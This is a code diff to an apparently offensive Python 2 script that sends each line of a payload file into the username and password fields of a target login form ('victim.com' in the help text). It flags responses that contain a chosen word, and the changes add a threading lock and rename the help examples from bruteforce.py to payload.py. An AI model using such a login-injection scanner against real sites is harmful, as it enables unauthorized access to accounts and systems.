@@ -40,6 +40,7 @@ about = colored("""
 
 print about
 
+lock = threading.Lock()
 
 def PayloadScan(target,username,password,exception,payload):
 
@@ -48,7 +49,10 @@ def PayloadScan(target,username,password,exception,payload):
 		cj       = CookieJar()
 		opener   = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
 		data     = urllib.urlencode({username:payload,password:payload})
+		
+		lock.acquire()
 		u        = opener.open(target, data)
+		lock.release()
 		getcode  = u.getcode()
 		match    = re.findall(r'{}'.format(exception),u.read())
 
@@ -71,14 +75,14 @@ def Main():
                           action = "store", #stored
                           dest   = "target",
                           #type   = "string", #int tipi
-                          help = "for example: ./bruteforce.py -t victim.com")
+                          help = "for example: ./payload.py -t victim.com")
 
 
 	parser.add_argument('-uc',
                           action = "store", #stored
                           dest   = "uc",
                           #type   = "string", #int tipi
-                          help = "for example: ./bruteforce.py -uc username column")
+                          help = "for example: ./payload.py -uc username column")
 
 
 
@@ -86,14 +90,14 @@ def Main():
                           action = "store", #stored
                           dest   = "pc",
                           #type   = "string", #int tipi
-                          help = "for example: ./bruteforce.py -pc password column")
+                          help = "for example: ./payload.py -pc password column")
 
 
 	parser.add_argument('-exception',
                           action = "store", #stored
                           dest   = "exception",
                           #type   = "string", #int tipi
-                          help = "for example: ./bruteforce.py -a exception word")
+                          help = "for example: ./payload.py -a exception word")
 
 
 
@@ -125,10 +129,10 @@ def Main():
 	except IOError:
 		sys.exit('File doesn\'t exist!')
 
-	threads = []
+	
 	for line in f.readlines():
+         
          t = threading.Thread(target = PayloadScan, args = (target,args.uc,args.pc,args.exception,line.rstrip('\n')))
-         threads.append(t)
          t.start()
 	
 
